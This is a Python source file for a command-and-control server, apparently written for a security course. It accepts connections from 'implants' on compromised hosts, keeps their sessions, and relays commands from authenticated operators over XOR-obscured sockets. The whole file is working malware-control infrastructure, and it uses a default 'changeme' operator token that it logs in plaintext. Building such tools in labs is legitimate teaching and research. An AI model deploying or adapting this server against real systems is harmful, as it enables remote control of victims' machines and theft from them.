#!/usr/bin/env python3
import json
import logging
import os
import queue
import socket
import struct
import threading
import uuid

IMPLANT_HOST = "0.0.0.0"
IMPLANT_PORT = 9999
OPERATOR_HOST = "0.0.0.0"
OPERATOR_PORT = 9998
OPERATOR_TOKEN = os.environ.get("OPERATOR_TOKEN", "changeme")

_KEY = b"cs564"
_log_path = os.environ.get("C2_LOG", "c2.log")

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s  %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler(_log_path, encoding="utf-8"),
    ],
)
log = logging.getLogger("c2")


def _xor(data):
    return bytes(b ^ _KEY[i % len(_KEY)] for i, b in enumerate(data))


def _send(conn, data):
    enc = _xor(data)
    conn.sendall(struct.pack(">I", len(enc)) + enc)


def _recv(conn):
    hdr = b""
    while len(hdr) < 4:
        c = conn.recv(4 - len(hdr))
        if not c:
            raise ConnectionError("closed")
        hdr += c
    length = struct.unpack(">I", hdr)[0]
    buf = b""
    while len(buf) < length:
        c = conn.recv(length - len(buf))
        if not c:
            raise ConnectionError("closed")
        buf += c
    return _xor(buf)


class ImplantSession(object):
    def __init__(self, implant_id, conn, info):
        self.implant_id = implant_id
        self.conn = conn
        self.info = info
        self.task_queue = queue.Queue()

    def _push(self, command, payload):
        req = {
            "command": command,
            "request_id": str(uuid.uuid4()),
            "payload": payload,
        }
        _send(self.conn, json.dumps(req).encode())
        raw = _recv(self.conn)
        return json.loads(raw.decode())


_sessions = {}
_sessions_lock = threading.Lock()


def _handle_implant(conn, addr):
    session = None
    try:
        raw = _recv(conn)
        msg = json.loads(raw.decode())
        info = msg.get("payload", {})

        implant_id = "IMP-" + str(uuid.uuid4())[:8].upper()
        session = ImplantSession(implant_id, conn, info)

        ack = {"status": "OK", "implant_id": implant_id}
        _send(conn, json.dumps(ack).encode())

        with _sessions_lock:
            _sessions[implant_id] = session
        log.info("+ IMPLANT  %s  %s", implant_id, info)

        while True:
            command, payload, result_q = session.task_queue.get()
            if command is None:
                break
            try:
                result = session._push(command, payload)
                log.info("  TASK     %s  %s  OK", implant_id, command)
                result_q.put({"status": "ok", "result": result})
            except (ConnectionError, OSError, BrokenPipeError) as exc:
                log.info("  TASK     %s  %s  SOCKET_DEAD %s", implant_id, command, exc)
                result_q.put(
                    {"status": "error", "message": "socket closed: {0}".format(exc)}
                )
                break
            except Exception as exc:
                log.info("  TASK     %s  %s  ERR %s", implant_id, command, exc)
                result_q.put({"status": "error", "message": str(exc)})

    except Exception as exc:
        log.info("! IMPLANT  %s  error: %s", addr, exc)
    finally:
        with _sessions_lock:
            dead = [k for k, v in list(_sessions.items()) if v.conn is conn]
            for k in dead:
                _sessions.pop(k, None)
                log.info("- IMPLANT  %s  disconnected", k)
        conn.close()


def _handle_operator(conn, addr):
    try:
        raw = _recv(conn)
        msg = json.loads(raw.decode())
        if msg.get("action") != "AUTH" or msg.get("token") != OPERATOR_TOKEN:
            _send(
                conn,
                json.dumps({"status": "error", "message": "Unauthorized"}).encode(),
            )
            log.info("! OPERATOR %s  AUTH FAILED", addr)
            return
        _send(conn, json.dumps({"status": "ok", "message": "Authenticated"}).encode())
    except Exception as exc:
        log.info("! OPERATOR %s  auth error: %s", addr, exc)
        conn.close()
        return

    log.info("+ OPERATOR %s", addr)
    try:
        while True:
            raw = _recv(conn)
            if not raw:
                break
            msg = json.loads(raw.decode())
            action = msg.get("action", "")

            if action == "LIST":
                with _sessions_lock:
                    result = {
                        "status": "ok",
                        "implants": {iid: s.info for iid, s in _sessions.items()},
                    }
                log.info("  LIST     %s  %d implants", addr, len(result["implants"]))

            elif action == "TASK":
                target_id = msg.get("target", "")
                command = msg.get("command", "")
                payload = msg.get("payload", {})

                with _sessions_lock:
                    session = _sessions.get(target_id)

                if session is None:
                    result = {
                        "status": "error",
                        "message": "Implant '{0}' not connected".format(target_id),
                    }
                else:
                    rq = queue.Queue()
                    session.task_queue.put((command, payload, rq))
                    try:
                        result = rq.get(timeout=20)
                    except queue.Empty:
                        result = {"status": "error", "message": "timed out"}

            else:
                result = {
                    "status": "error",
                    "message": "unknown action: {0!r}".format(action),
                }

            _send(conn, json.dumps(result).encode())

    except ConnectionError:
        pass
    except Exception as exc:
        log.info("! OPERATOR %s  error: %s", addr, exc)
    finally:
        conn.close()
        log.info("- OPERATOR %s  disconnected", addr)


def _implant_listener():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((IMPLANT_HOST, IMPLANT_PORT))
    srv.listen()
    log.info("LISTEN  implants  %s:%d", IMPLANT_HOST, IMPLANT_PORT)
    while True:
        conn, addr = srv.accept()
        threading.Thread(target=_handle_implant, args=(conn, addr), daemon=True).start()


def _operator_listener():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((OPERATOR_HOST, OPERATOR_PORT))
    srv.listen()
    log.info("LISTEN  operators %s:%d", OPERATOR_HOST, OPERATOR_PORT)
    while True:
        conn, addr = srv.accept()
        threading.Thread(
            target=_handle_operator, args=(conn, addr), daemon=True
        ).start()


if __name__ == "__main__":
    log.info("C2 starting  token=%s", OPERATOR_TOKEN)
    t1 = threading.Thread(target=_implant_listener, daemon=True)
    t2 = threading.Thread(target=_operator_listener, daemon=True)
    t1.start()
    t2.start()
    log.info("Ready.")
    try:
        t1.join()
    except KeyboardInterrupt:
        log.info("Shutdown.")
